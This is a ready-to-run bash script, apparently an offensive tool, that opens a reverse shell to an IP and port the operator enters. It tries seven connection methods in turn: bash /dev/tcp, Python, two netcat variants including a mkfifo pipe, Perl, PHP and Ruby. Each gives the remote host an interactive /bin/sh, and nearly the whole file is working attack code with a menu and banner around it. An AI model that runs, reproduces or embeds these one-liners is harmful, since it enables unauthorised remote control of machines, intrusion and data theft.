#!/bin/bash

# Multi-Method Reverse Shell Script
# Works on Termux, Linux, Windows (WSL), macOS

# Colors
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
PURPLE="\033[1;35m"
CYAN="\033[1;36m"
NC="\033[0m" # No Color

# Banner
function show_banner() {
    clear
    echo -e "${PURPLE}"
    echo " ███╗   ███╗██╗   ██╗██╗  ██╗████████╗██╗██████╗ ███████╗██████╗ "
    echo " ████╗ ████║██║   ██║██║ ██╔╝╚══██╔══╝██║██╔══██╗██╔════╝██╔══██╗"
    echo " ██╔████╔██║██║   ██║█████╔╝    ██║   ██║██████╔╝█████╗  ██████╔╝"
    echo " ██║╚██╔╝██║██║   ██║██╔═██╗    ██║   ██║██╔══██╗██╔══╝  ██╔══██╗"
    echo " ██║ ╚═╝ ██║╚██████╔╝██║  ██╗   ██║   ██║██║  ██║███████╗██║  ██║"
    echo " ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${CYAN}  Reverse Shell with 7 Different Connection Methods ${NC}"
    echo -e "${YELLOW}------------------------------------------------${NC}"
    echo
}

# Check if command exists
function cmd_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Method 1: Bash /dev/tcp
function method_bash() {
    echo -e "${GREEN}[+] Trying ${YELLOW}Bash /dev/tcp${GREEN} method...${NC}"
    bash -c "bash -i >& /dev/tcp/$1/$2 0>&1"
}

# Method 2: Python
function method_python() {
    echo -e "${GREEN}[+] Trying ${YELLOW}Python${GREEN} method...${NC}"
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$1'",'$2'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
}

# Method 3: Netcat (Traditional)
function method_nc() {
    echo -e "${GREEN}[+] Trying ${YELLOW}Netcat${GREEN} method...${NC}"
    nc -e /bin/sh "$1" "$2"
}

# Method 4: Netcat (No -e flag)
function method_nc_nopipe() {
    echo -e "${GREEN}[+] Trying ${YELLOW}Netcat (No -e)${GREEN} method...${NC}"
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc "$1" "$2" > /tmp/f
}

# Method 5: Perl
function method_perl() {
    echo -e "${GREEN}[+] Trying ${YELLOW}Perl${GREEN} method...${NC}"
    perl -e 'use Socket;$i="'$1'";$p='$2';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
}

# Method 6: PHP
function method_php() {
    echo -e "${GREEN}[+] Trying ${YELLOW}PHP${GREEN} method...${NC}"
    php -r '$sock=fsockopen("'$1'",'$2');exec("/bin/sh -i <&3 >&3 2>&3");'
}

# Method 7: Ruby
function method_ruby() {
    echo -e "${GREEN}[+] Trying ${YELLOW}Ruby${GREEN} method...${NC}"
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("'$1'","'$2'");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
}

# Main function
function start_rev_shell() {
    local ip="$1"
    local port="$2"
    
    echo -e "${CYAN}[*] Attempting reverse shell to ${YELLOW}$ip:$port${NC}"
    
    # Try all methods one by one
    if cmd_exists "bash" && [ -e /dev/tcp ]; then
        method_bash "$ip" "$port" && return
    fi
    
    if cmd_exists "python3" || cmd_exists "python"; then
        method_python "$ip" "$port" && return
    fi
    
    if cmd_exists "nc"; then
        method_nc "$ip" "$port" || method_nc_nopipe "$ip" "$port" && return
    fi
    
    if cmd_exists "perl"; then
        method_perl "$ip" "$port" && return
    fi
    
    if cmd_exists "php"; then
        method_php "$ip" "$port" && return
    fi
    
    if cmd_exists "ruby"; then
        method_ruby "$ip" "$port" && return
    fi
    
    echo -e "${RED}[!] All methods failed. Install one of: python, nc, perl, php, ruby${NC}"
    exit 1
}

# Main menu
function main_menu() {
    show_banner
    
    echo -e "${BLUE}1) Start Reverse Shell"
    echo -e "2) Exit"
    echo -ne "\n${CYAN}Choose option: ${NC}"
    
    read -r choice
    
    case "$choice" in
        1)
            echo -ne "${YELLOW}Enter IP: ${NC}"
            read -r ip
            echo -ne "${YELLOW}Enter Port: ${NC}"
            read -r port
            
            # Validate input
            if [[ ! $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                echo -e "${RED}[!] Invalid IP format!${NC}"
                sleep 1
                return
            fi
            
            if [[ ! $port =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
                echo -e "${RED}[!] Invalid port (1-65535)!${NC}"
                sleep 1
                return
            fi
            
            start_rev_shell "$ip" "$port"
            ;;
        2)
            echo -e "${GREEN}[+] Exiting...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Invalid option!${NC}"
            sleep 1
            ;;
    esac
}

# Run main menu in loop
while true; do
    main_menu
done
